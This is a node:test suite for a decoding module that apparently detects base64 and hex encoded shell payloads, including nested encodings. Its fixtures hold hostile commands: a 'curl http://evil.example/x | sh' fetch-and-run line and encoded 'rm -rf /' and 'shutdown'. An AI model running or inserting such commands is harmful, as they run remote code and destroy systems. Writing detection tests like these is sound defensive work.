// node:test suite for the encoded-payload decoding module (runs against lib/ after `npm run build`).
// Usage: npm run build && node --test tools/
import test from 'node:test'
import assert from 'node:assert/strict'
import { decodeEncodedCandidates } from '../lib/decode.js'

const b64 = (s) => Buffer.from(s, 'utf8').toString('base64')

test('decode: single base64 payload is found', () => {
  const payload = 'curl http://evil.example/x | sh'
  const found = decodeEncodedCandidates(`echo ${b64(payload)} | base64 -d`)
  assert.ok(found.length >= 1)
  assert.ok(found.some((f) => f.decoded.includes('curl http://evil.example/x')))
})

test('decode: nested double-encoded payload reaches depth 2', () => {
  const payload = 'curl http://evil.example/x | sh'
  const once = b64(payload)
  const twice = b64(once)
  const found = decodeEncodedCandidates(`x ${twice} y`)
  assert.ok(found.length >= 2)
  const byDepth = new Map(found.map((f) => [f.depth, f]))
  assert.equal(byDepth.get(1)?.decoded, once)
  assert.equal(byDepth.get(2)?.decoded, payload)
})

test('decode: hex payload is decoded', () => {
  const payload = 'curl http://evil.example/x | sh'
  const hex = Buffer.from(payload, 'utf8').toString('hex')
  const found = decodeEncodedCandidates(`xxd -r ${hex}`)
  assert.ok(found.some((f) => f.kind === 'hex' && f.decoded.includes('curl')))
})

test('decode: short padded base64 is decoded (rm -rf / is only 12 chars)', () => {
  const found = decodeEncodedCandidates('echo cm0gLXJmIC8= | base64 -d')
  assert.ok(found.some((f) => f.kind === 'base64' && f.decoded.includes('rm -rf /')))
  const shutdown = decodeEncodedCandidates('echo c2h1dGRvd24= | base64 -d')
  assert.ok(shutdown.some((f) => f.decoded.includes('shutdown')))
})

test('decode: short unpadded tokens are still rejected', () => {
  const found = decodeEncodedCandidates('login2fa status9x')
  assert.equal(found.length, 0)
})

test('decode: printable-filter rejects random base64-looking junk', () => {
  // 'abcdefghijklmnop' as base64 decodes to high bytes (mostly non-printable).
  const found = decodeEncodedCandidates('abcdefghijklmnop')
  assert.equal(found.length, 0)
})

test('decode: total output is budget-capped', () => {
  const payload = 'hello world! '.repeat(2000)
  const found = decodeEncodedCandidates(b64(payload), 1000)
  assert.ok(found.length >= 1)
  const total = found.reduce((n, f) => n + f.decoded.length, 0)
  assert.ok(total <= 1000)
})
